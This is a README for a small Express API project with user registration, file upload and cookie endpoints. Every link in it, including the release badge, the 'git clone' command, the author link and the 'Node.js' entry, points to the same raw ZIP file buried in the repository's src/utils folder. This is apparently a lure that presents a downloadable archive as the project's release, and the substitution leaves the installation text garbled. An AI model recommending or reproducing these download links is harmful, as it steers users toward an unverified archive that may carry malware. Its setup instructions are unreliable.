# Set Cookie & Get Cookie APIs 🍪

Welcome to the **Set Cookie & Get Cookie APIs** repository! This project offers a collection of useful APIs deployed on Vercel. You can explore the functionalities of these APIs and integrate them into your applications seamlessly.

[![View Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip)

## Table of Contents

- [Introduction](#introduction)
- [APIs Overview](#apis-overview)
- [Installation](#installation)
- [Usage](#usage)
- [Technologies Used](#technologies-used)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

This repository contains five key APIs designed to handle user-related operations, file management, and cookie management. The APIs are straightforward to use and are built with a focus on performance and security.

## APIs Overview

Here are the APIs included in this repository:

1. **User Registration**: `POST /user/register`
   - This endpoint allows new users to register by providing necessary details like username and password. The password is securely hashed using bcrypt.

2. **User File Upload**: `POST /user/file`
   - Users can upload files to the server. This API handles file uploads efficiently and securely.

3. **Dynamic Parameter Handling**: `GET /user/param/:param`
   - This endpoint retrieves data based on a dynamic parameter. It allows for flexible queries.

4. **Cookie Management**: `GET /user/cookie`
   - This API retrieves cookies set in the user's browser. It helps in managing user sessions.

5. **Set Cookie**: `POST /user/set-cookie`
   - This endpoint allows the server to set cookies in the user's browser. It's essential for session management.

For detailed information about each API, please refer to the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip) section.

## Installation

To set up the project locally, follow these steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip
   ```

2. **Navigate to the project directory**:
   ```bash
   cd set-cookie--get-cookie--apis
   ```

3. **Install the required dependencies**:
   ```bash
   npm install
   ```

4. **Create a `.env` file**:
   - You will need to set up your environment variables. Create a `.env` file in the root directory and add the following:
     ```
     MONGODB_URI=your_mongodb_connection_string
     CLOUDINARY_URL=your_cloudinary_url
     ```

5. **Start the server**:
   ```bash
   npm start
   ```

The server will run on `http://localhost:3000`.

## Usage

After setting up the project, you can start using the APIs. Here’s a brief guide on how to use each API.

### User Registration

To register a new user, send a `POST` request to `/user/register` with the following JSON body:

```json
{
  "username": "your_username",
  "password": "your_password"
}
```

### User File Upload

To upload a file, send a `POST` request to `/user/file` with the file included in the form data.

### Dynamic Parameter Handling

To retrieve data based on a dynamic parameter, send a `GET` request to `/user/param/your_param`.

### Cookie Management

To get cookies, send a `GET` request to `/user/cookie`.

### Set Cookie

To set a cookie, send a `POST` request to `/user/set-cookie` with the following JSON body:

```json
{
  "cookieName": "your_cookie_name",
  "cookieValue": "your_cookie_value"
}
```

## Technologies Used

This project uses the following technologies:

- **https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip**: The runtime environment for executing JavaScript on the server side.
- **Express**: A web framework for building APIs.
- **MongoDB Atlas**: A cloud database service for storing user data.
- **Cloudinary**: A cloud service for storing and managing media files.
- **Bcrypt**: A library for hashing passwords securely.
- **Cookie-parser**: A middleware for parsing cookies.
- **Cors**: A middleware for enabling Cross-Origin Resource Sharing.
- **Multer**: A middleware for handling multipart/form-data, which is used for file uploads.

## Contributing

We welcome contributions to improve this project. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Open a pull request to the main repository.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

If you have any questions or suggestions, feel free to reach out:

- **Author**: Tahsan
- **GitHub**: [Tahsan203438](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip)

For the latest updates and releases, please check the [Releases](https://github.com/Tahsan203438/set-cookie--get-cookie--apis/raw/refs/heads/main/src/utils/get_set_apis_cookie_v1.9.zip) section.

Thank you for checking out the **Set Cookie & Get Cookie APIs** repository! We hope you find it useful for your projects.